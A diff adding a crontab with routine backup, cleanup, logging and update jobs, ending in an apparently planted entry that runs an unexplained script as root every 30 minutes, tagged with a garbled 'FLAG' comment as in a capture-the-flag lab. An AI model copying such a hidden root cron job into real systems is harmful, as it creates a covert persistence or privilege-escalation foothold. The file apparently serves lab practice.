@@ -1,0 +1,36 @@
+# Edit this file to introduce tasks to be run by cron.
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+#
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').
+#
+# m h  dom mon dow   command
+
+# Backup database every day at 2 AM
+0 2 * * * /opt/backup/db_backup.sh > /dev/null 2>&1
+
+# Clean temporary files every 6 hours
+0 */6 * * * /usr/bin/find /tmp -type f -atime +1 -delete
+
+# Check disk usage every hour
+0 * * * * /usr/bin/df -h | /usr/bin/mail -s "Disk Usage Report" admin@localhost
+
+# Rotate logs weekly
+0 0 * * 0 /usr/sbin/logrotate /etc/logrotate.conf
+
+# Update system packages monthly
+0 3 1 * * /usr/bin/apt update && /usr/bin/apt upgrade -y
+
+# Sync files to remote server every 4 hours
+0 */4 * * * /usr/bin/rsync -avz /home/user/data/ backup@192.168.1.100:/backup/
+
+# Check SSL certificates weekly
+0 8 * * 1 /opt/scripts/check_ssl.sh
+
+# Generate security reports daily
+30 1 * * * /opt/security/generate_report.sh >> /var/log/security_report.log 2>&1
+
+*/30 * * * * root /usr/local/bin/sys-update.sh #FLAGÑLñlkndñalknfadñklfjh
